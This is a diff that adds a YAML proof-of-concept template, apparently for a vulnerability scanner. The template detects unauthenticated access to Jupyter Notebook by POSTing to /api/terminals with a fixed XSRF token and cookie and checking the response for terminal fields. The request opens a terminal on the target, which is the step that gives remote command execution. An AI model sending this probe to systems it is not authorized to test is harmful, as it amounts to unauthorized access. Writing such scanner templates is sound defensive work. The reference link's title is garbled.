@@ -1,0 +1,21 @@
+name: yaml-poc-jupyter-notebook-unauthorized_access-CT-456638
+binding: 85704c93-1299-4589-812d-fdf0408cf59e
+detail:
+    author: system_user
+    links:
+        - http://wiki.peiqi.tech/wiki/webapp/Jupyter%20Notebook/Jupyter%20Notebook%20Œ¥ ⁄»®∑√Œ ‘∂≥Ã√¸¡Ó÷¥––¬©∂¥.html
+    vulnerability:
+        id: b8b342fa-1861-4f05-8c42-29dd5ad8b16d
+        level: critical
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /api/terminals
+            headers:
+                X-XSRFToken: 2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
+                cookie: _xsrf=2|7a4faae0|819f5adf7edaef5e74502c9d0c75a604|1653492335
+        expression: response.body.bcontains(b"name") && response.body.bcontains(b"last_activity") && response.status == 200
+expression: r1()
